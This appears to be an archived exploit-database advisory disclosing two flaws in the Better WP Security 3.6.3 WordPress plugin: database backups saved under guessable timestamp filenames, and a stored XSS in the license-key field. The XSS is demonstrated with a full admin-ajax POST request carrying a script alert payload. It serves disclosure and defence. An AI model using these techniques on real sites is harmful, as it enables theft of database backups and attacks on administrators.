@@ -1,0 +1,80 @@
+id: 21897
+date: 02/15/2014
+title: WordPress Better WP Security 3.6.3 XSS / Disclosure Vulnerabilities
+author: yashar shahinzadeh
+cves: 
+
+###################################################################################################################################
+# Exploit Title: Wordpress Plugin - Better WP Security multiple vulnerability
+# Date: 2014 11 Fabruary
+# Exploit Author: Yashar shahinzadeh
+# Special thanks to Mormoroth
+# Credit goes for: http://y-shahinzadeh.ir & ha.cker.ir
+# Vendor Homepage: https://wordpress.org/plugins/better-wp-security/
+# Tested on: Linux & Windows, PHP 5.3.2
+# Affected Version : 3.6.3 (Last)
+#
+# Contacts: { http://Twitter.com/YShahinzadeh , http://y-shahinzadeh.ir , http://Twitter.com/Mormoroth , http://mormoroth.ir }
+###################################################################################################################################
+
+Summary:
+========
+1. Information Disclosure (Database Backup)
+2. Persisted XSS
+2. Further Information
+
+1. Information Disclosure (Database Backup):
+============================================
+The Better WP Security suffers from information disclosure. In backup section, there are two options. Firstly, emailing backup file via email which is secured enough. 
+Secondly , the backup files can be stored in /wp-content/plugins/better-wp-security/backups/ folder. It's protected by an index, althoguh it's named by a weak random function.
+
+Vulnerable code:
+
+  ...
+  ...
+  $return .= PHP_EOL . PHP_EOL;
+    
+  //save file
+  $file = 'database-backup-' . current_time( 'timestamp' );
+  $handle = @fopen( BWPS_PP . 'backups/' . $file . '.sql', 'w+' );
+  @fwrite( $handle, $return );
+  @fclose( $handle );
+  ...
+  ...
+  
+current_time() function is a Wordpress's function which returns current timestamp. As it can be seen, 'database-backup-' is hardcoded, so guessing or carrying out a brute force attack 
+isn’t hard.
+
+
+2. Persisted XSS:
+=================
+The Better WP Security also suffers from stored XSS. In the premium box, by entering a valid key user can upgrade plugin to premium. Escaping is applied on the inputs. 
+However, it isn't sufficient to prevent occurring XSS. The key is stored in database within wp_options table. better-wp-security_licensekey holds the input's value. The plugin
+reads the key from database, then the key is shown to user and it's triggering the vulnerability. So, submiting "><scrip>alert(1)</script> would be a dimonstration.
+
+POST /wordpress-3.8/wp-admin/admin-ajax.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://localhost/wordpress-3.8/wp-admin/admin.php?page=better-wp-security
+Content-Length: 154
+Cookie: wordpress_28c73b7b2dbeccbe781794c02ea85151=admin%7C1392286658%7C751462ff973e5134c6754a1f9e632196; wp-settings-time-1=1392116314; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_28c73b7b2dbeccbe781794c02ea85151=admin%7C1392286658%7C0c253ec7ed5976931c8480ab85be8c1f
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+action=foolic_validate_license-better-wp-security&license=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E&nonce=71277a8a19&input=better-wp-security%5Blicense%5D
+
+
+Stored XSS in administration panel can be leveraged to exploit another administrator (client hacking) or even be a small piece in a chain of attack’s steps.
+
+
+3. Further Information:
+=======================
+Further analysis about backup function can be found at my blog, http://blog.y-shahinzadeh.ir
+
+#  0day.today [2023-03-26]  #
